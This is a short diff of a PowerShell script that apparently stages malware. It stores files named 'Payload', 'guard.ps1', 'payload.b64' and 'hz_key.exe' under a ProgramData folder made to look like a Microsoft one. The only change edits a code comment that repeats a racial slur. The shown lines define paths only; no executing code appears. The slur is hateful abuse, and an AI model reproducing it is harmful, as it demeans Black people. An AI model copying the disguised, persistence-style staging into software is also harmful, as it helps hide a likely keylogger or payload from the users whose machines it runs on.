@@ -17,7 +17,7 @@ $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIden
 
 $script:PS = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
 $script:BaseDir = Join-Path $env:ProgramData 'Microsoft\Windows\HZGUI'
-$script:Payload = Join-Path $script:BaseDir 'hzgui.ps1'						# NIGGER NIGGER NIGGER
+$script:Payload = Join-Path $script:BaseDir 'hzgui.ps1'						# NIGGER NIGGER NIGGER nigger nigegr
 $script:Guard = Join-Path $script:BaseDir 'guard.ps1'
 $script:B64 = Join-Path $script:BaseDir 'payload.b64'
 $script:HK = Join-Path $script:BaseDir 'hz_key.exe'
